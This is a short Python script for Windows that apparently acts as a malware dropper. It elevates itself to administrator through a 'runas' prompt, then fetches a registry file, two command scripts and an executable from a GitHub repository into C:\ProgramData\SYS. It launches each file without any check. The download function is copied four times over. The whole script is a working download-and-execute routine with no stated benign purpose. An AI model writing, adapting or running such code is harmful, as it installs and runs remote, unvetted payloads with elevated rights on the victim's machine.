import ctypes
import os
import sys
import time
import requests


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin():
    def download(url: str, dest_folder: str):
        if not os.path.exists(dest_folder):
            os.makedirs(dest_folder)  # create folder if it does not exist

        filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
        file_path = os.path.join(dest_folder, filename)

        r = requests.get(url, stream=True)
        if r.ok:
            print("saving to", os.path.abspath(file_path))
            with open(file_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk)
                        f.flush()
                        os.fsync(f.fileno())
        else:  # HTTP status code 4XX/5XX
            print("Download failed: status code {}\n{}".format(r.status_code, r.text))


    download("https://raw.githubusercontent.com/MASMob2022/sys/main/sys1.reg", dest_folder="C:\ProgramData/SYS")

    time.sleep(5)

    os.startfile("C:\ProgramData/SYS/sys1.reg")

    def download(url: str, dest_folder: str):
        if not os.path.exists(dest_folder):
            os.makedirs(dest_folder)  # create folder if it does not exist

        filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
        file_path = os.path.join(dest_folder, filename)

        r = requests.get(url, stream=True)
        if r.ok:
            print("saving to", os.path.abspath(file_path))
            with open(file_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk)
                        f.flush()
                        os.fsync(f.fileno())
        else:  # HTTP status code 4XX/5XX
            print("Download failed: status code {}\n{}".format(r.status_code, r.text))


    download("https://raw.githubusercontent.com/MASMob2022/sys/main/sys2.cmd", dest_folder="C:\ProgramData/SYS")

    time.sleep(5)

    os.startfile("C:\ProgramData/SYS/sys2.cmd")

    time.sleep(15)


    def download(url: str, dest_folder: str):
        if not os.path.exists(dest_folder):
            os.makedirs(dest_folder)  # create folder if it does not exist

        filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
        file_path = os.path.join(dest_folder, filename)

        r = requests.get(url, stream=True)
        if r.ok:
            print("saving to", os.path.abspath(file_path))
            with open(file_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk)
                        f.flush()
                        os.fsync(f.fileno())
        else:  # HTTP status code 4XX/5XX
            print("Download failed: status code {}\n{}".format(r.status_code, r.text))


    download("https://raw.githubusercontent.com/MASMob2022/sys/main/sys0.cmd", dest_folder="C:\ProgramData\SYS")

    time.sleep(5)

    os.startfile("C:\ProgramData/SYS/sys0.cmd")

    time.sleep(5)

    def download(url: str, dest_folder: str):
        if not os.path.exists(dest_folder):
            os.makedirs(dest_folder)  # create folder if it does not exist

        filename = url.split('/')[-1].replace(" ", "_")  # be careful with file names
        file_path = os.path.join(dest_folder, filename)

        r = requests.get(url, stream=True)
        if r.ok:
            print("saving to", os.path.abspath(file_path))
            with open(file_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk)
                        f.flush()
                        os.fsync(f.fileno())
        else:  # HTTP status code 4XX/5XX
            print("Download failed: status code {}\n{}".format(r.status_code, r.text))


    download("https://github.com/MASMob2022/sys/raw/main/sys3.exe", dest_folder="C:\ProgramData\SYS")

    time.sleep(10)

    os.startfile("C:\ProgramData/SYS/sys3.exe")

    time.sleep(5)

else:
    print("Not Admin")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
